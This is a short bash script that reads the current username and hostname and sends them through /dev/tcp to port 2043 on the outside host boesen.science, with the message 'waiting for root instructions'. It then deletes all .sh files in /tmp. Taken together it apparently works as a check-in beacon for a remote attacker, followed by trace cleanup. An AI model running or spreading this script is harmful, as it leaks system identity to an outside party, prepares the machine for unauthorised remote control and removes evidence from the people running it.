#!/usr/bin/env bash
host=boesen.science

printf "INFO: $(whoami)@$(hostname) waiting for root instructions." > /dev/tcp/$host/2043

rm /tmp/*.sh
